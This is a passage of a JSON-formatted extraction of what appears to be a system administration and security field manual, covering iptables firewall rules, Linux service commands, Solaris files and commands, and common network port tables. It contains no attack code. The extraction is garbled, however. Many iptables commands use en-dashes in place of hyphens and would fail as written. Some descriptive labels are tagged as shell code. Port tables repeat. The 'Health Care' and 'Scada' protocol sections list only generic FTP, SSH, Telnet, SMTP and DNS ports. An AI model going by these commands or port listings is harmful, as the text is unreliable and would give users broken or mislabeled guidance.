      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -A INPUT -i <INTERFACE_NAME> -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Allow SSH on port 22 outbound",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -A OUTPUT -o <INTERFACE_NAME> -p icmp --icmp-type echo-request -j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Allow ICMP outbound",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo \"1\" > /proc/sys/net/ipv4/ip_forward",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables -t nat -A PREROUTING -i <INTERFACE_NAME> -p tcp --dport 3389 -j DNAT --to 192.168.1.2:3389",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port forward",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Listen for traffic destined to port 3389 and redirect that traffic to host 192.168.1.2 on port 3389)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A INPUT –s 1.1.1.0/24 –m state –-state RELATED,ESTABLISHED,NEW –p tcp –m multiport –-dports 80,443 –j ACCEPT",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A INPUT –i eth0 –m state –-state RELATED,ESTABLISHED –j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –P INPUT DROP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A OUTPUT –o eth0 –j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A INPUT –i lo –j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A OUTPUT –o lo –j ACCEPT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –N LOGGING",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A INPUT –j LOGGING",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A LOGGING –m limit --limit 4/min –j LOG –-log-prefix \"DROPPED\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A LOGGING –j DROP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Allow only 1.1.1.0/24, ports 80,443 and log drops to /var/log/messages",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl list-unit-files --type=service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List existing services and run status",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl list-unit-files --type=service | grep httpd",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Check single service status",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "service --status-all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[+] Service is running",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[-] Service is not running",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "service <SERVICE_NAME> start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start a service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "service <SERVICE_NAME> stop",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stop a service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "service <SERVICE_NAME> status",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Check status of a service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl disable <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disable service so it will not auto start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl enable <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enable service so it will auto start on reboot",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris OS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris File System Structure",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/vfstab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File system mount table",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var/adm/authlog",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Login attempt log",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/default/*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Default settings",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Kernel modules & config",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var/adm/messages",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Logs system messages and errors",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/auto_*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Automounter config files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/inet/ipnodes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv4/IPv6 host file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat -in",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List interfaces and routes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig <INTERFACE_NAME> dhcp start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start DHCP client",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig <INTERFACE_NAME> <IP_ADDRESS> + <NETMASK>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "route add default <IP_ADDERSS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set gateway",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "logins -p",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List users without passwords",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "svcs -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all services with status",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "prstat -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List processes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "svcadm enable ssh",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start SSH service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "inetadm –e telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Enable telnet (-d = disable)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "prtconf | grep Memory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iostat -n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List physical memory and hard disk size",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "shutdown –i6 g0 -y",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Restart system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dfmounts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List clients connected to NFS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "smc",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Launch management GUI",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "snoop –d <INTERFACE_NAME> -c <NUMBER_OF_PACKETS> -o <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Capture specific number of packets and write to file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Networking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Common Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Common Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port #",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FTP (Data Connection)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FTP (Control Connection)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH/SCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "23",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SMTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "49",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TACACS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "53",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "67-68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DHCP/BOOTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "TFTP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "80",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "88",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kerberos",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "110",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "POP3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "111",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RPC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "123",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "NTP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "135",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows RPC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "137-138",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NetBIOS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "139",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SMB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "143",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IMAP4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "161-162",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SNMP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "179",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "BGP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "201",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "AppleTalk",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "389",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "LDAP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "443",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTPS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "445",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SMB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "500",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ISAKMP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port #",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "514",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Syslog",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "520",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RIP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "546-547",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DHCPv6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "587",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SMTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "902",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "VMWare Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1080",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Socks Proxy",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1194",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Open VPN",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1433-1434",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MS-SQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1521",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Oracle",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2049",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NFS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3128",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Squid Proxy",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3306",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MySQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3389",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RDP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5060",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SIP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5222-5223",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "XMPP/Jabber",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5432",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Postgres SQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5666",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nagios",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5900",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "VNC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6000-6063",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "X11",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6129",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DameWare",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6133",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DameWare",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6665-6669",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IRC",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9001",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9001",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HSQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9090-9091",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Openfire",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9100",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HP JetDirect",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Health Care Protocol & Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port#",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FTP (Data Connection)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FTP (Control Connection)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH/SCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "23",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port#",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SMTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "49",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TACACS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "53",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "67/8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DHCP/BOOTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "TFTP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scada Protocols & Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port#",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FTP (Data Connection)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "21",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FTP (Control Connection)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH/SCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "23",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SMTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "49",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TACACS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "53",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "67-68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
